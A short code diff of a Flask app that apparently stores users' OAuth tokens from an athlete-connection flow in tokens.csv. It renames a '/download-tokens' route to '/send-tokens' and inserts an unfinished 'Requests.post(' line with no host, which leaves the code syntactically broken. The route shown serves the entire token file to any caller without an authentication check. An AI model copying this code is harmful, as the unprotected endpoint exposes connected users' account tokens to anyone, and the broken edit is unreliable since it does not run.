@@ -6,6 +6,7 @@ import logging
 import smtplib
 from email.message import EmailMessage
 
+
 app = Flask(__name__)
 
 CLIENT_ID = os.getenv("CLIENT_ID")
@@ -62,9 +63,10 @@ def callback():
 
     return f"✅ User {athlete_id} connected successfully!"
     
-@app.route('/download-tokens')
-def download_tokens():
+@app.route('/send-tokens')
+def send_tokens():
     try:
+        Requests.post(
         return send_file('tokens.csv', mimetype='text/csv', as_attachment=True, download_name='tokens.csv')
     except Exception as e:
         logging.error(f"Error sending tokens.csv file: {e}")
